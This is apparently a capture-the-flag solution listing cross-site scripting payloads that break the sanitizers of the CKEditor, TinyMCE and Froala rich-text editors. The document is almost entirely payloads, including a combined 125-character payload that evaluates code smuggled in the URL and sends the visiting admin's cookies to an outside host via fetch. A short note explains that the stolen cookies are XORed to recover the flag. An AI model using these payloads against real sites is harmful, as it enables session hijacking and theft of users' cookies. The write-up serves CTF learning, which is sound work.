## Payloads

### CKEditor
```html
<!--{cke_{cke_protected}protected}><!--><!--><img src="a" onerror="alert(document.domain)"><!-->
```

### TinyMCE
```html
<select><caption><noframes><input><img src="a" onerror="alert(document.domain)">
```

### Froala
```html
<noframes><img src="a" onerror="alert(document.domain)">
```

### Combined
```html
<select><select><caption><noframes><input><!--{cke_{cke_protected}protected}><!--><!--><img src=a onerror=alert(1)><!-->
```

### Final payload that passes the text param limit of 125 characters:
```html
<select><select><caption><noframes><input><!--{cke_{cke_protected}protected}><!--><!--><img src=a onerror=eval('%60'%2bURL)><!-->&g=`+fetch(`http://aw.rs?cookie=`+document.cookie);//
```

## Notes
* The url the admin visits is `http://web:5000/${editor}/?text=${text}` so extra query params can be used
* Once you have the three cookies they can be xored together to get the flag